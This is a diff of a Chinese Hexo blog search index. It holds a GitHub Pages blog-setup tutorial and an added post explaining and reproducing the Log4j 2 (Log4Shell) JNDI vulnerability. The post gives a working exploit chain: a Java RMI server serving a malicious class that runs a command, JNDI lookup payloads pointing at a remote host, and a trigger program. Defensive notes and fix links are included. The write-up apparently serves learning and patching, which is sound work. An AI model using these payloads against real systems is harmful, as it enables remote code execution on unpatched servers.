@@ -1,6 +1,102 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>hexo+github搭建个人博客</title>
+    <url>/2021/11/09/hexo-github%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
+    <content><![CDATA[<h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>有那么多的博客平台，为什么要搭建个人博客？</p>
+<blockquote>
+<ul>
+<li>基于共享平台的策略会审核发布内容并可能随时被删</li>
+<li>你是否想搭建专属的个性化博客，定义自己的精美页面</li>
+<li>作为一个编程从业者，有一个专门记录自己成长的博客可以作为求职的一个技能栈介绍</li>
+</ul>
+</blockquote>
+<p>本系列教程将搭建一个这样的博客<a href="https://hackt0.github.io">Hackt0’s Blog预览</a>(博客还在完善中)<br><a href="https://hackt0.github.io/2021/11/09/hexo-github%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2">原文链接</a></p>
+<h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><blockquote>
+<ul>
+<li>github账号</li>
+<li>node.js 、git</li>
+</ul>
+</blockquote>
+<h3 id="本文环境"><a href="#本文环境" class="headerlink" title="本文环境"></a>本文环境</h3><blockquote>
+<ul>
+<li>Window11/Windows10 x64</li>
+<li>node.js v16.11.1(使用最新版本运行hexo server 是会出现告警，但是不影响使用，如果介意，可以使用低版本)</li>
+<li>Git v2.33.1 </li>
+<li>hexo v5.4.0</li>
+</ul>
+</blockquote>
+<h2 id="准备工作-1"><a href="#准备工作-1" class="headerlink" title="准备工作"></a>准备工作</h2><h3 id="创建github仓库"><a href="#创建github仓库" class="headerlink" title="创建github仓库"></a>创建github仓库</h3><blockquote>
+<p>首先在<a href="https://github.com/">gitHub官网</a>注册一个账号(<strong>注册的用户名会和之后的博客域名相关，可以直接想好，避免二次修改</strong>)，由于github在外网，可能出现无法访问的情况，可以参考<a href="https://hackt0.github.io/2021/11/09/解决github访问失败/">解决 github 访问失败 | Hackt0’s Blog</a></p>
+<p>注册完成后会收到一份邮件，要点击完成下注册验证</p>
+<p>以新建账号为例做介绍，创建一个仓库</p>
+<p><img src="https://i.loli.net/2021/11/09/U2tXyYQisGm5Par.png" alt="create repository.png"></p>
+<p>Repository name一栏填上<code>用户名.github.io</code>，如上图用户名为shuhan520，那么对应的Repository name就是<code>shuhan520.github.io</code>，再勾选一下<code>Add a README file</code>选项用于快速生成项目页面，其余选项全部默认即可</p>
+<p>创建后可以在Settings-Pages看到自己的专属域名了（<del>不推荐使用projectpage，如果使用其他名称生成的域名会带有路径，搭建博客时会出现路径导致的资源访问问题</del>），此时访问网页是刚刚创建的README文档内容，没有勾选Add a README file选项的需要添加内容才可以生成</p>
+<p><img src="https://i.loli.net/2021/11/09/TanQNDwvzWgpsU4.png" alt="GithubPages.png"></p>
+<p>上图Custom domain可以绑定其他域名</p>
+</blockquote>
+<h3 id="配置SSH-Key"><a href="#配置SSH-Key" class="headerlink" title="配置SSH Key"></a>配置SSH Key</h3><blockquote>
+<p>可以使用<a href="https://git-scm.com/downloads">Git官网</a>下载和安装git，安装完成后鼠标右键空白处菜单栏会出现<code>git bash here</code>选项，设置个人邮箱和用户名</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git config --global user.name <span class="string">&quot;你的GitHub用户名&quot;</span></span><br><span class="line">$ git config --global user.email <span class="string">&quot;你的GitHub注册邮箱&quot;</span></span><br></pre></td></tr></table></figure>
+<p>生成ssh-key文件</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh-keygen -t rsa -C <span class="string">&quot;你的GitHub注册邮箱&quot;</span></span><br></pre></td></tr></table></figure>
+<p>生成过程中需要设置生成路径、密码，默认空白即可；注意使用默认路径时是否存在提示already exists，如果有可以输入’n’退出，重设路径或者使用现有ssh-key(邮箱相同时)</p>
+<p>找到生成的.ssh的文件夹中的id_rsa.pub，记事本打开复制全部内容即可</p>
+<p>可以在<a href="https://github.com/settings/keys">SSH and GPG keys (github.com)</a>点击New SSH Key，title为任意内容，key输入刚刚复制的key文件内容，点击Add SSH Key即可</p>
+<p>打开cmd命令行窗口输入</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh git@github.com</span><br></pre></td></tr></table></figure>
+<p>看到以下内容即可(初次访问可能需要添加GitHub域名到可信域名，确认连接时输入yes即可)</p>
+<blockquote>
+<p>PTY allocation request failed on channel 0<br>Hi shuhan520! You’ve successfully authenticated, but GitHub does not provide shell access.<br>Connection to github.com closed.</p>
+</blockquote>
+</blockquote>
+<h3 id="安装node-js"><a href="#安装node-js" class="headerlink" title="安装node.js"></a>安装node.js</h3><blockquote>
+<p>可以使用<a href="https://nodejs.org/zh-cn/download/">node.js官网</a>下载和安装node.js，打开控制台输入以下命令可正常输出版本号即安装完成</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ node -v</span><br><span class="line">$ npm -v</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>至此所有的准备工作已经完成</p>
+<h2 id="博客搭建"><a href="#博客搭建" class="headerlink" title="博客搭建"></a>博客搭建</h2><h3 id="框架选取"><a href="#框架选取" class="headerlink" title="框架选取"></a>框架选取</h3><p>快速构建博客可以选择<code>hexo，hugo，wordpress</code>等框架，本文使用的时hexo，因为静态页面搭建相对简单，检索时发现hexo拥有很多美化主题和美化教程，同时自动根据markdown文档识别文章列表、分类、标签、翻页等动态内容，相对于小白比较容易上手</p>
+<blockquote>
+<p> <a href="http://hexo.io/">hexo官网</a><br> <a href="https://github.com/hexojs/hexo">hexo github</a></p>
+</blockquote>
+<h3 id="hexo安装"><a href="#hexo安装" class="headerlink" title="hexo安装"></a>hexo安装</h3><p>新建一个单独的目录用于搭建博客，在新建目录下打开cmd命令行输入以下命令</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install -g hexo</span><br></pre></td></tr></table></figure>
+<p>安装完成后输入以下命令初始化</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo init</span><br></pre></td></tr></table></figure>
+<p>hexo会自动下载相关文件到本地，此时可以通过以下命令开启本地预览</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo g</span><br><span class="line">$ hexo s</span><br></pre></td></tr></table></figure>
+<p>打开浏览器访问 <a href="http://localhost:4000/">http://localhost:4000</a>即可看到未发布的页面效果(本地访问可以使用浏览器隐私模式，避免因缓存而导致修改效果无法正常显示)</p>
+<p>如果提示端口占用可以使用以下命令更改端口</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server -p 5000 <span class="comment">#更改端口到5000</span></span><br></pre></td></tr></table></figure>
+<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><h4 id="语言"><a href="#语言" class="headerlink" title="语言"></a>语言</h4><p>修改hexo根目录下的<code>_config.yml</code>中的<code>language</code>，默认是en，主题支持三种语言</p>
+<ul>
+<li>default(en)</li>
+<li>zh-CN (简体中文)</li>
+<li>zh-TW (繁体中文)</li>
+</ul>
+<h4 id="站点配置"><a href="#站点配置" class="headerlink" title="站点配置"></a>站点配置</h4><p>修改hexo根目录下的<code>_config.yml</code>中的<code>Site</code>和<code>URL</code>部分</p>
+<h3 id="推送到Github"><a href="#推送到Github" class="headerlink" title="推送到Github"></a>推送到Github</h3><p>安装github插件</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>
+<p>修改hexo主目录下的站点配置文件<code>_config.yml</code>，修改最下方deploy为如下内容，yml以缩进表示层级关系，所以务必要使用空格对齐<br><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">   <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">   <span class="attr">repo:</span> <span class="string">git@github.com:`your</span> <span class="string">username`/`your</span> <span class="string">username`.github.io.git</span></span><br><span class="line">   <span class="attr">branch:</span> <span class="string">main</span></span><br></pre></td></tr></table></figure><br>推送到github仓库：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo d</span><br></pre></td></tr></table></figure>
+<p>如果推送时提示</p>
+<blockquote>
+<p>nothing to commit, working tree clean</p>
+</blockquote>
+<p>请清除本地缓存，重新生成后推送：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo clean &amp;&amp; hexo g</span><br><span class="line">$ hexo d</span><br></pre></td></tr></table></figure></p>
+<p>至此，可以使用github分配的个人域名访问到博客了</p>
+<p>个人使用记录，仅供参考，如果配置过程中遇到的问题可以在评论区留言</p>
+<p>更多美化和使用教程将在下期推出</p>
+]]></content>
+      <categories>
+        <category>hexo</category>
+      </categories>
+      <tags>
+        <tag>blog</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>hexo个人博客美化</title>
     <url>/2021/12/12/hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E7%BE%8E%E5%8C%96/</url>
     <content><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>博客页面总不好看所以没心情记录？本站同款美化教程来了！</p>
@@ -158,324 +254,47 @@
       </tags>
   </entry>
   <entry>
-    <title>hexo+github搭建个人博客</title>
-    <url>/2021/11/09/hexo-github%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
-    <content><![CDATA[<h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>有那么多的博客平台，为什么要搭建个人博客？</p>
-<blockquote>
-<ul>
-<li>基于共享平台的策略会审核发布内容并可能随时被删</li>
-<li>你是否想搭建专属的个性化博客，定义自己的精美页面</li>
-<li>作为一个编程从业者，有一个专门记录自己成长的博客可以作为求职的一个技能栈介绍</li>
-</ul>
-</blockquote>
-<p>本系列教程将搭建一个这样的博客<a href="https://hackt0.github.io">Hackt0’s Blog预览</a>(博客还在完善中)<br><a href="https://hackt0.github.io/2021/11/09/hexo-github%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2">原文链接</a></p>
-<h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><blockquote>
-<ul>
-<li>github账号</li>
-<li>node.js 、git</li>
-</ul>
-</blockquote>
-<h3 id="本文环境"><a href="#本文环境" class="headerlink" title="本文环境"></a>本文环境</h3><blockquote>
-<ul>
-<li>Window11/Windows10 x64</li>
-<li>node.js v16.11.1(使用最新版本运行hexo server 是会出现告警，但是不影响使用，如果介意，可以使用低版本)</li>
-<li>Git v2.33.1 </li>
-<li>hexo v5.4.0</li>
-</ul>
-</blockquote>
-<h2 id="准备工作-1"><a href="#准备工作-1" class="headerlink" title="准备工作"></a>准备工作</h2><h3 id="创建github仓库"><a href="#创建github仓库" class="headerlink" title="创建github仓库"></a>创建github仓库</h3><blockquote>
-<p>首先在<a href="https://github.com/">gitHub官网</a>注册一个账号(<strong>注册的用户名会和之后的博客域名相关，可以直接想好，避免二次修改</strong>)，由于github在外网，可能出现无法访问的情况，可以参考<a href="https://hackt0.github.io/2021/11/09/解决github访问失败/">解决 github 访问失败 | Hackt0’s Blog</a></p>
-<p>注册完成后会收到一份邮件，要点击完成下注册验证</p>
-<p>以新建账号为例做介绍，创建一个仓库</p>
-<p><img src="https://i.loli.net/2021/11/09/U2tXyYQisGm5Par.png" alt="create repository.png"></p>
-<p>Repository name一栏填上<code>用户名.github.io</code>，如上图用户名为shuhan520，那么对应的Repository name就是<code>shuhan520.github.io</code>，再勾选一下<code>Add a README file</code>选项用于快速生成项目页面，其余选项全部默认即可</p>
-<p>创建后可以在Settings-Pages看到自己的专属域名了（<del>不推荐使用projectpage，如果使用其他名称生成的域名会带有路径，搭建博客时会出现路径导致的资源访问问题</del>），此时访问网页是刚刚创建的README文档内容，没有勾选Add a README file选项的需要添加内容才可以生成</p>
-<p><img src="https://i.loli.net/2021/11/09/TanQNDwvzWgpsU4.png" alt="GithubPages.png"></p>
-<p>上图Custom domain可以绑定其他域名</p>
-</blockquote>
-<h3 id="配置SSH-Key"><a href="#配置SSH-Key" class="headerlink" title="配置SSH Key"></a>配置SSH Key</h3><blockquote>
-<p>可以使用<a href="https://git-scm.com/downloads">Git官网</a>下载和安装git，安装完成后鼠标右键空白处菜单栏会出现<code>git bash here</code>选项，设置个人邮箱和用户名</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git config --global user.name <span class="string">&quot;你的GitHub用户名&quot;</span></span><br><span class="line">$ git config --global user.email <span class="string">&quot;你的GitHub注册邮箱&quot;</span></span><br></pre></td></tr></table></figure>
-<p>生成ssh-key文件</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh-keygen -t rsa -C <span class="string">&quot;你的GitHub注册邮箱&quot;</span></span><br></pre></td></tr></table></figure>
-<p>生成过程中需要设置生成路径、密码，默认空白即可；注意使用默认路径时是否存在提示already exists，如果有可以输入’n’退出，重设路径或者使用现有ssh-key(邮箱相同时)</p>
-<p>找到生成的.ssh的文件夹中的id_rsa.pub，记事本打开复制全部内容即可</p>
-<p>可以在<a href="https://github.com/settings/keys">SSH and GPG keys (github.com)</a>点击New SSH Key，title为任意内容，key输入刚刚复制的key文件内容，点击Add SSH Key即可</p>
-<p>打开cmd命令行窗口输入</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh git@github.com</span><br></pre></td></tr></table></figure>
-<p>看到以下内容即可(初次访问可能需要添加GitHub域名到可信域名，确认连接时输入yes即可)</p>
-<blockquote>
-<p>PTY allocation request failed on channel 0<br>Hi shuhan520! You’ve successfully authenticated, but GitHub does not provide shell access.<br>Connection to github.com closed.</p>
-</blockquote>
-</blockquote>
-<h3 id="安装node-js"><a href="#安装node-js" class="headerlink" title="安装node.js"></a>安装node.js</h3><blockquote>
-<p>可以使用<a href="https://nodejs.org/zh-cn/download/">node.js官网</a>下载和安装node.js，打开控制台输入以下命令可正常输出版本号即安装完成</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ node -v</span><br><span class="line">$ npm -v</span><br></pre></td></tr></table></figure>
-</blockquote>
-<p>至此所有的准备工作已经完成</p>
-<h2 id="博客搭建"><a href="#博客搭建" class="headerlink" title="博客搭建"></a>博客搭建</h2><h3 id="框架选取"><a href="#框架选取" class="headerlink" title="框架选取"></a>框架选取</h3><p>快速构建博客可以选择<code>hexo，hugo，wordpress</code>等框架，本文使用的时hexo，因为静态页面搭建相对简单，检索时发现hexo拥有很多美化主题和美化教程，同时自动根据markdown文档识别文章列表、分类、标签、翻页等动态内容，相对于小白比较容易上手</p>
-<blockquote>
-<p> <a href="http://hexo.io/">hexo官网</a><br> <a href="https://github.com/hexojs/hexo">hexo github</a></p>
-</blockquote>
-<h3 id="hexo安装"><a href="#hexo安装" class="headerlink" title="hexo安装"></a>hexo安装</h3><p>新建一个单独的目录用于搭建博客，在新建目录下打开cmd命令行输入以下命令</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install -g hexo</span><br></pre></td></tr></table></figure>
-<p>安装完成后输入以下命令初始化</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo init</span><br></pre></td></tr></table></figure>
-<p>hexo会自动下载相关文件到本地，此时可以通过以下命令开启本地预览</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo g</span><br><span class="line">$ hexo s</span><br></pre></td></tr></table></figure>
-<p>打开浏览器访问 <a href="http://localhost:4000/">http://localhost:4000</a>即可看到未发布的页面效果(本地访问可以使用浏览器隐私模式，避免因缓存而导致修改效果无法正常显示)</p>
-<p>如果提示端口占用可以使用以下命令更改端口</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server -p 5000 <span class="comment">#更改端口到5000</span></span><br></pre></td></tr></table></figure>
-<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><h4 id="语言"><a href="#语言" class="headerlink" title="语言"></a>语言</h4><p>修改hexo根目录下的<code>_config.yml</code>中的<code>language</code>，默认是en，主题支持三种语言</p>
-<ul>
-<li>default(en)</li>
-<li>zh-CN (简体中文)</li>
-<li>zh-TW (繁体中文)</li>
-</ul>
-<h4 id="站点配置"><a href="#站点配置" class="headerlink" title="站点配置"></a>站点配置</h4><p>修改hexo根目录下的<code>_config.yml</code>中的<code>Site</code>和<code>URL</code>部分</p>
-<h3 id="推送到Github"><a href="#推送到Github" class="headerlink" title="推送到Github"></a>推送到Github</h3><p>安装github插件</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>
-<p>修改hexo主目录下的站点配置文件<code>_config.yml</code>，修改最下方deploy为如下内容，yml以缩进表示层级关系，所以务必要使用空格对齐<br><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">   <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">   <span class="attr">repo:</span> <span class="string">git@github.com:`your</span> <span class="string">username`/`your</span> <span class="string">username`.github.io.git</span></span><br><span class="line">   <span class="attr">branch:</span> <span class="string">main</span></span><br></pre></td></tr></table></figure><br>推送到github仓库：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo d</span><br></pre></td></tr></table></figure>
-<p>如果推送时提示</p>
-<blockquote>
-<p>nothing to commit, working tree clean</p>
-</blockquote>
-<p>请清除本地缓存，重新生成后推送：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo clean &amp;&amp; hexo g</span><br><span class="line">$ hexo d</span><br></pre></td></tr></table></figure></p>
-<p>至此，可以使用github分配的个人域名访问到博客了</p>
-<p>个人使用记录，仅供参考，如果配置过程中遇到的问题可以在评论区留言</p>
-<p>更多美化和使用教程将在下期推出</p>
+    <title>log4j 2漏洞原理及复现</title>
+    <url>/2021/12/13/%E6%A0%B8%E5%BC%B9%E7%BA%A7!log4j%202%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>被log4j2漏洞刷频了，公司也是紧急修复了一波，现在来整个盘一下这个漏洞到底是什么原理！测试漏洞的人太多，连dnslog很长一段时间都访问不了，最后还用的ceye测试复现的。</p>
+<div class="tabs" id="influence"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#influence-1">影响版本</button></li><li class="tab"><button type="button" data-href="#influence-2">影响范围</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="influence-1"><p><strong>Apache Log4j 2.x&lt;=2.15.0.rc1</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="influence-2"><p>Spring-Boot-strater-log4j2Apache<br>Struts2Apache<br>SolrApache<br>FlinkApache<br>DruidElasticSearch<br>Flume<br>Dubbo<br>Redis<br>Logstash<br>Kafka<br>vmvare</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>
+<h1 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>最主要的漏洞成因就是下面这张图了，log4j2提供的lookup功能</p>
+<p><img src="https://s2.loli.net/2021/12/13/7C3zoiVgf1Tjq2B.jpg" alt="log4j2.jpg"></p>
+<p>日志中包含 <code>$&#123;&#125;</code>,lookup功能就会将表达式的内容替换为表达式解析后的内容，而不是表达式本身。log4j 2将基本的解析都做了实现：<br><div class="tabs" id="lookup"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#lookup-1">实例</button></li><li class="tab"><button type="button" data-href="#lookup-2">支持类型</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="lookup-1"><p>比如常见的用户登陆日志记录</p>
+<p><img src="https://s2.loli.net/2021/12/13/FbTqPux3Ydn9SzE.png" alt="lookup.png"></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="lookup-2"><blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;ctx:loginId&#125;</span><br><span class="line">$&#123;map:type&#125;</span><br><span class="line">$&#123;filename&#125;</span><br><span class="line">$&#123;date:MM-dd-yyyy&#125;</span><br><span class="line">$&#123;docker:containerId&#125;$&#123;docker:containerName&#125;</span><br><span class="line">$&#123;docker:imageName&#125;</span><br><span class="line">$&#123;env:USER&#125;</span><br><span class="line">$&#123;event:Marker&#125;</span><br><span class="line">$&#123;mdc:UserId&#125;</span><br><span class="line">$&#123;java&#125;</span><br><span class="line">$&#123;jndi:logging/context-name&#125;</span><br><span class="line">$&#123;hostName&#125;</span><br><span class="line">$&#123;docker:containerId&#125;</span><br><span class="line">$&#123;k8s&#125;</span><br><span class="line">$&#123;log4j&#125;</span><br><span class="line">$&#123;main&#125;</span><br><span class="line">$&#123;name&#125;</span><br><span class="line">$&#123;marker&#125;</span><br><span class="line">$&#123;spring&#125;</span><br><span class="line">$&#123;sys:logPath&#125;</span><br><span class="line">$&#123;web:rootDir&#125;</span><br></pre></td></tr></table></figure>
+</blockquote><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></p>
+<p>而其中的JNDI（Java Naming and Directory Interface）就是本次的主题了，就是提供一个目录系统，并将服务与对象关联起来，可以使用名称来访问对象。而log4j 2中JNDI解析未作限制，可以直接访问到远程对象，如果是自己的服务器还好说，那如果访问到黑客的服务器呢？</p>
+<p>也就是当记录日志的一部分是用户可控时，就可以构造恶意字符串使服务器记录日志时调用JNDI访问恶意对象，也就是流传出的payload构成：</p>
+<p>${jndi:ldap:xxx.xxx.xxx.xxx:xxxx/exp}</p>
+<p>我们可以将上面日志记录的代码简单修改一下，假设用户名是从外部获取的用户输入，此时构建一个恶意用户名<code>$&#123;jndi:ladp://z2xcu7.dnslog.cn/exp&#125;</code>，然后触发日志记录(可以借助DNSLog生成临时域名用于查看测试是否生效）</p>
+<p><img src="https://s2.loli.net/2021/12/14/DqpwP4NmOai1YQj.png" alt="ldap.png"></p>
+<p>可以看到，记录日志时发起了JNDI解析，访问了DNS提供的域名并生成记录</p>
+<h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><p>其实JNDI通过SPI（Service Provider Interface）封装了多个协议，包括LDAP、RMI、DNS、NIS、NDS、RMI、CORBA；</p>
+<p>复现选择了使用RMI服务，搭建较为快速</p>
+<p>攻击思路（文章中使用的jdk1.8）：</p>
+<h3 id="找到目标服务器记录日志的地方，且记录的部分内容可控"><a href="#找到目标服务器记录日志的地方，且记录的部分内容可控" class="headerlink" title="找到目标服务器记录日志的地方，且记录的部分内容可控"></a>找到目标服务器记录日志的地方，且记录的部分内容可控</h3><p>我们还是选择之前的模拟日志记录，假设站点会记录用户登陆日志，实际上大部分网站确实会做相关功能</p>
+<h3 id="搭建RMI服务端，包含需要执行的恶意代码"><a href="#搭建RMI服务端，包含需要执行的恶意代码" class="headerlink" title="搭建RMI服务端，包含需要执行的恶意代码"></a>搭建RMI服务端，包含需要执行的恶意代码</h3><p>RMI服务端搭建，监听本地8888（自定义）端口，用Reference类引用恶意对象</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> server;</span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException, AlreadyBoundException </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">8888</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Create RMI registry on port 8888&quot;</span>);</span><br><span class="line">        Reference reference = <span class="keyword">new</span> Reference(<span class="string">&quot;server.Log4jRCE&quot;</span>, <span class="string">&quot;server.Log4jRCE&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;exp&quot;</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>恶意对象模拟执行cmd打开计算器，并且输出一个语句用于标记执行处</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> server;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Log4jRCE</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;exec in here&quot;</span>);</span><br><span class="line">            String [] cmd=&#123;<span class="string">&quot;calc&quot;</span>&#125;;</span><br><span class="line">            java.lang.Runtime.getRuntime().exec(cmd).waitFor();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>执行RMIServer，创建RMI服务</p>
+<h3 id="构建EXP触发目标服务器进行日志记录触发JNDI解析"><a href="#构建EXP触发目标服务器进行日志记录触发JNDI解析" class="headerlink" title="构建EXP触发目标服务器进行日志记录触发JNDI解析"></a>构建EXP触发目标服务器进行日志记录触发JNDI解析</h3><p>构建恶意用户名模拟输入，执行触发恶意解析</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">log4j</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger logger = LogManager.getLogger(log4j.class);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String username = <span class="string">&quot;$&#123;jndi:rmi://yourip:8888/exp&#125;&quot;</span>;</span><br><span class="line">        logger.error(username + <span class="string">&quot;is login on $&#123;java:os&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="解析结果定位到搭建的恶意服务端，目标服务器访问并触发恶意代码"><a href="#解析结果定位到搭建的恶意服务端，目标服务器访问并触发恶意代码" class="headerlink" title="解析结果定位到搭建的恶意服务端，目标服务器访问并触发恶意代码"></a>解析结果定位到搭建的恶意服务端，目标服务器访问并触发恶意代码</h3><p>恶意代码被执行，注意看恶意代码执行记录，是在日志记录的地方被执行</p>
+<p><img src="https://s2.loli.net/2021/12/14/RBLCYQ1laAiXvpD.png" alt="res.png"></p>
+<h3 id="其他信息"><a href="#其他信息" class="headerlink" title="其他信息"></a>其他信息</h3><p>看看大佬们都干了啥</p>
+<p><a href="https://m.weibo.cn/status/4713921489404877?wm=3333_2001&amp;from=10BC193010&amp;sourcetype=weixin">特斯拉测试</a><br><a href="https://mp.weixin.qq.com/s/tIv68iiGcXg-Fl4MQY0SGQ">主要利用模式</a></p>
+<h1 id="修复与检测"><a href="#修复与检测" class="headerlink" title="修复与检测"></a>修复与检测</h1><p>可以通过<code>$&#123;jndi</code>字串匹配是否受到攻击</p>
+<p>修复参考链接：</p>
+<p><a href="https://mp.weixin.qq.com/s/mb708YuskTyek29g-3pAEg">https://mp.weixin.qq.com/s/mb708YuskTyek29g-3pAEg</a></p>
+<p><a href="https://mp.weixin.qq.com/s/ClNpWamMn55BkholbUbo_g">https://mp.weixin.qq.com/s/ClNpWamMn55BkholbUbo_g</a></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>目前已证实服务器易受到漏洞攻击的公司包括苹果、亚马逊、特斯拉、谷歌、百度、腾讯、网易、京东、Twitter、 Steam等。据统计，共有<strong>6921</strong>个应用程序都有被攻击的风险，其中《我的世界》首轮即被波及。就连修改iPhone手机名称都能触发，<font color="red">最主要的是这是国外黑客玩了几个月玩腻了才公开的漏洞！</font></p>
+<p>一个范围广的0day漏洞可能导致整个互联网沦为肉鸡或者瘫痪，网络安全，任重而道远。</p>
